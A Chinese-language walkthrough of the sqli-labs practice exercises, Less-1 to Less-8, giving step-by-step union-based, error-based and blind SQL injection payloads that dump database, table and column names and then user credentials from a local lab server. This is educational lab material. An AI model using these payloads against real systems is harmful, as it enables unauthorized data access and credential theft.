# sqli-labs

## Less-1

![image-20240304232324396](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240304232324396.png)

打开hackbar输入?id=1

![image-20240304232403909](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240304232403909.png)

加个单引号之后报错，存在注入点且为字符型注入

![image-20240304232454703](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240304232454703.png)

使用group by查出有三列内容

![image-20240304232557959](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240304232557959.png)

把id改为0，并且使用union select来判断回显位置

![image-20240304232653887](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240304232653887.png)

```mysql
?id=0' union select 1,database(),version()--+
爆出数据库名为security，版本为5.7.26
```

```mysql
?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
爆出的表有emails,referers,uagents,users，其中users有用
```

```mysql
id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
爆出users表中有三列内容id,username,password
```

```MYSQL
?id=0' union select 1,group_concat(username,'~',password),3 from users--+
直接爆出用户名和密码
```

## Less-2

这关为数字型注入，和Less-1一样的步骤，只不过不需要用单引号来闭合

```MYSQL
?id=0 union select 1,group_concat(username,'~',password),3 from users--+
```

## Less-3

这关为字符型注入，只不过多了一个单括号

```mysql
http://127.0.0.1/sql/Less-3?id=0') union select 1,group_concat(username,'~',password),3 from users--+
```

## Less-4

这关为字符型注入，形式变为双引号加单括号

```mysql
http://127.0.0.1/sql/Less-4?id=0") union select 1,group_concat(username,'~',password),3 from users--+
```

## Less-5

```mysql
首先确定为字符型注入，然后使用group by确定列数，再使用union select 1,database(),3--+发现没有回显，于是可以使用报错注入
http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+ 
爆数据库名
http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3--+ 
爆表名
http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))),3--+
爆users表列名 
http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users))),3--+ 
爆信息，但是由于报错注入只能返回32个字符，所以要使用substring
http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(username,'~',password),25,30) from users))),3--+ 
substring使其从第25个字符开始往后再显示30个字符，再拼接起来就得到了所有用户名和密码
```

## Less-6

```mysql
和Less-5几乎一模一样，只需要把单引号改为双引号就行
http://127.0.0.1/sql/Less-6?id=0" union select 1,extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users))),3--+ 
```

## Less-7

```mysql
http://192.168.88.133/sql/Less-7?id=1'
报错，后面加--+依旧报错，改为'))后发现不报错了，此时便可开始注入
?id=1'))and length((select database()))>9--+
判断数据库名长度
?id=1'))and ascii(substr((select database()),1,1))=115--+
一个一个判断数据库的名字
?id=1'))and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
判断所有表名字符长度
?id=1'))and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
逐一判断表名
然后就是判断字段名，再逐一爆出字段内的内容，即username和password
很费时间！！！
```

## Less-8

```mysql
和第七关差不多，将'))换成'就行
```

## Less-9

